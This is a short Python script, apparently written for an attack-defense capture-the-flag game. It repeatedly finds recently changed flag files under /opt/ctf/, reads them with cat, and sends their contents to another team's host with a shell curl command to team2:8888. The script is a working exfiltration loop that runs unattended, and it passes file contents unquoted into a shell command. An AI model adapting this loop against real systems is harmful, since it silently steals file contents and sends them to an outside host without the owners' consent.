#!/usr/bin/python
__author__ = "Laurence Chang and Josh Smith"

#Program to find the most recently updated flag in /opt/ctf/<servicefile>/rw/
#This can be done by performing the command ls 

import os
import subprocess
import time


#using subprocess to parse and pipe arguments...
#using OS due to simply be able to pass in final argument into a variable
def main():	

	url = "team2:8080"
	#ls -t | head -n1
	path = "/opt/ctf/sample_py/rw/"	# we should somehow be able to dynamically change this variable maybe?	
	p1 = os.popen("find %s -cmin -3"%path)
	p1_output = p1.read()
	p1.close()
	file_list = p1_output.split("\n") #populate list with potential flag files
	flag_list = ""

	for flg_file in file_list:
		p2 = subprocess.Popen(["cat",flg_file], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
		p2_out,err = p2.communicate()
		if p2_out != "":
			flag_list = flag_list + p2_out + "/"

	
#	print 'curl team2:8888/%s'%flag_list
	os.system('curl team2:8888/%s'%flag_list)


'''To do thoughts '''
# Construct http packet using payload
# Send http packet to our hostname
# maybe optimize somehow such as checking if var != prevVar rather than relying soley on time?


if __name__ == "__main__":
	while(1):
		main()
		time.sleep(5)
    	


